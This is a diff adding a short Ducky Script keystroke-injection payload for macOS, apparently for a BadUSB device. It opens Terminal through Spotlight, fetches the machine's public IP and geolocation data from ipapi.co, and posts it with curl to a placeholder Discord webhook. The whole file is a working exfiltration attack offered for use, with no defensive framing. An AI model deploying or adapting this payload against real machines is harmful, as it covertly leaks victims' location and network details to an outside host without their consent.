@@ -1,0 +1,19 @@
+REM ==============================================================
+REM Script created by bst04
+REM Works on macOS systems
+REM This script opens Terminal, fetches the public IP address
+REM of the device, and sends it to a Discord webhook.
+REM It uses curl to send the IP without JSON.
+REM ===============================================================
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 1000
+STRING location=$(curl -s https://ipapi.co/json/)
+ENTER
+DELAY 1000
+STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$location" https://yourwebhook
+ENTER
